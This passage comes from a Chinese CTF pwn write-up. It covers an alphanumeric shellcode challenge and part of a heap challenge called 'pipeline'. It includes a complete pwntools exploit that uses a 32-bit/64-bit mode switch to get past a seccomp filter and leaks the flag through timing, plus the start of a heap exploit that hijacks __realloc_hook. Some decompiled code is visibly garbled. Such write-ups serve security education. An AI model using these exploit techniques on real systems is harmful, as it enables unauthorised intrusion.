        syscall
        '''
由于不能使用write的系统调用，只能采用延时爆破了
        if idx == 0:
            code += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(idx, ch)
        else:
            code += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(idx, ch)
idx为读入的字符偏移，ch是我们猜测的字符，若想等，就进入死循环，否则就退出。
通过时间来判断是否想等。
总结:
这个题确实有点坑，shellcode必须为可显字符，后面绕过了，只能用少量的系统函数，64位架构时，只能使用read, mmap,
fstat，我还以为切换架构到32位可以绕过syscall检测，想不到只允许调用open，
其他的read和write都不行，又重新切换到64位来执行read，再采用爆破读出来。
####  exp
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    # Author: i0gan
    from pwn import *
    import os
    r   =  lambda x : io.recv(x)
    ra  =  lambda   : io.recvall()
    rl  =  lambda   : io.recvline(keepends = True)
    ru  =  lambda x : io.recvuntil(x, drop = True)
    s   =  lambda x : io.send(x)
    sl  =  lambda x : io.sendline(x)
    sa  =  lambda x, y : io.sendafter(x, y)
    sla =  lambda x, y : io.sendlineafter(x, y)
    ia  =  lambda : io.interactive()
    c   =  lambda : io.close()
    li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
    #context.log_level='debug'
    context.terminal = ['tmux', 'splitw', '-h']
    #context.arch = 'amd64'
    elf_path  = './shellcode'
    libc_path = '/glibc/2.23/64/lib/libc.so.6'
    libc_path = './libc.so.6'
    # remote server ip and port
    host = "39.105.137.118:50050"
    # if local debug
    LOCAL = 0
    LIBC  = 0
    #--------------------------func-----------------------------    def db():
        if(LOCAL):
            gdb.attach(io)
    def gen_code():
        fd = open('sc.bin', 'wb')
        code = '''
        mov r15, rbx
        xor rdx, rdx
        add dx, 0x1080
        mov rsi, r15
        add si, 0x120
        xor rax, rax
        syscall
        jmp rsi
        '''
        p = asm(code, arch = 'amd64')
        fd.write(p)
        fd.close()
        cmd = '~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input="./sc.bin"'
        p = os.popen(cmd).read()
        print('shellcode: ' + p)
        return p
    #--------------------------exploit--------------------------    # ref: https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/tqpsqr
    # ref: https://blog.csdn.net/SmalOSnail/article/details/105236336
    # ref: http://blog.leanote.com/post/xp0int/%5BPwn%5D-Steak-cpt.shao
    # ref: https://zhuanlan.zhihu.com/p/57648345
    #  ~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input="sc.bin" > o
    def exploit(idx, ch):
        li('exploit...')
        '''
        git clone https://github.com/TaQini/alpha3.git
        cd alpha3
        python ./ALPHA3.py x64 ascii mixedcase rax --input="sc.bin"
        rax: shellcode base_address
        '''
        # python ./ALPHA3.py x64 ascii mixedcase rax --input="sc.bin"
        #p = gen_code()
        p = 'Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8k1L0I3z2m4p4N4p0Y1O3c8L2k4u4v2t0O1L0A400V044p3E0c'
        s(p)
        code = '''
        /*mmap*/
        mov r9d, 0          /* off */
        mov r8d, 0xFFFFFFFF /* fd */ 
        mov r10d, 0x22 /* flags */
        mov edx, 7          /* prot */
        mov esi, 0x1000      /* len */
        mov edi, 0x20000          /* addr */
        mov eax, 9
        syscall 
        /*read 32 shellcode*/
        xor rax, rax
        mov edi, 0
        mov esi, 0x20000
        mov edx, 0x1000 
        syscall
        /*retf to 32*/
        mov rax, 0x2300020000
        push rax
        '''
        p = asm(code, arch = 'amd64')
        p += b'\xCB' # retf
        #p += p32(0x400000) + p32(0x23) # ret addr + 0x23:32bit sign
        sleep(0.01)
        s(p)
        code = '''
        mov esp, 0x20a00
        /*open*/
        mov eax, 5 
        mov ebx, 0x20020
        xor ecx, ecx
        xor edx, edx
        int 0x80
        /*retf to 64*/
        push 0x33
        push 0x20030
        '''
        db()
        p = asm(code, arch = 'i386')
        p += b'\xCB' # retf
        p = p.ljust(0x20, b'\x90')
        p += b'./flag\x00'
        p = p.ljust(0x30, b'\x90')
        code = ''' 
        xor rax, rax
        mov edi, 3
        mov rsi, rsp
        mov edx, 0x100
        syscall
        '''
        if idx == 0:
            code += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(idx, ch)
        else:
            code += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(idx, ch)
        p += asm(code, arch = 'amd64')
        sleep(0.01)
        s(p)
        start = time.time()
        try:
            io.recv(timeout = 2)
        except:
            pass
        end = time.time()
        if (end - start > 1.5):
            return ch
        else:
            return None
    def finish():
        ia()
        c()
    #--------------------------main-----------------------------    if __name__ == '__main__':
        flag = ''
        idx = 3
        while True:
            for ch in range(0x20, 127):
                if LOCAL:
                    elf = ELF(elf_path)
                    if LIBC:
                        libc = ELF(libc_path)
                    io = elf.process()
                else:
                    elf = ELF(elf_path)
                    io = remote(host.split(':')[0], int(host.split(':')[1]))
                    if LIBC:
                        libc = ELF(libc_path)
                ret = exploit(idx, ch)
                if(ret != None):
                    li('found: ' + chr(ch))
                    flag += chr(ch)
                    li('flag: ' + flag)
                    idx += 1
                io.close()
###  pipeline
没有free函数，通过设置大小为0即可实现释放内存功能。
找了偏移，chunk头部链表逻辑，没有发现漏洞，在编辑数据的功能中，发现了个整型溢出漏洞。
漏洞点
    _QWORD *edit_body()
    {
      _QWORD *result; // rax
      int size; // eax
      int index; // [rsp+10h] [rbp-10h]
      int v3; // [rsp+14h] [rbp-Ch]
      _QWORD *buf; // [rsp+18h] [rbp-8h]
      index = print("index: ");
      result = (_QWORD *)get_buf(index);
      buf = result;
      if ( result )
      {
        result = (_QWORD *)*result;
        if ( *buf )
        {
          v3 = print("size: ");
          printf("data: ");
          size = *((_DWORD *)buf + 3) - *((_DWORD *)buf + 2);// size - offset
          if ( v3 = result) )
      {
        puts("error");
        exit(0);
      }
      return result;
    }
而check_mem_buf的值在初始化的时候赋予了
    unsigned int init_()
    {
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      check_mem_buf = (__int64)malloc(0x10uLL);
      *(_QWORD *)check_mem_buf = check_mem_buf + 16;
      *(_QWORD *)(check_mem_buf + 8) = 0x21000LL;   // memsize
      return alarm(0x78u);
    }
基本上我们只能在堆段中实现任意地址写入了，这也比较好绕过，每个编辑功能都有个head
chunk，修改head中的body指针，就可以实现任意地址写入数据了。
修改`__realloc_hook`为system，再调用realloc函数即可调用system。
####  exp
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    # Author: i0gan
    from pwn import *
    import os
    r   =  lambda x : io.recv(x)
    ra  =  lambda   : io.recvall()
    rl  =  lambda   : io.recvline(keepends = True)
    ru  =  lambda x : io.recvuntil(x, drop = True)
    s   =  lambda x : io.send(x)
    sl  =  lambda x : io.sendline(x)
    sa  =  lambda x, y : io.sendafter(x, y)
    sla =  lambda x, y : io.sendlineafter(x, y)
    ia  =  lambda : io.interactive()
    c   =  lambda : io.close()
    li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
    context.log_level='debug'
    context.terminal = ['tmux', 'splitw', '-h']
    #context.arch = 'amd64'
    elf_path  = 'pipeline'
    libc_path = '/glibc/2.23/64/lib/libc.so.6'
    libc_path = './libc.so.6'
    #libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
    # remote server ip and port
    host = "59.110.173.239:2399"
    # if local debug
    LOCAL = 0
    LIBC  = 1
    #--------------------------func-----------------------------    def db():
        if(LOCAL):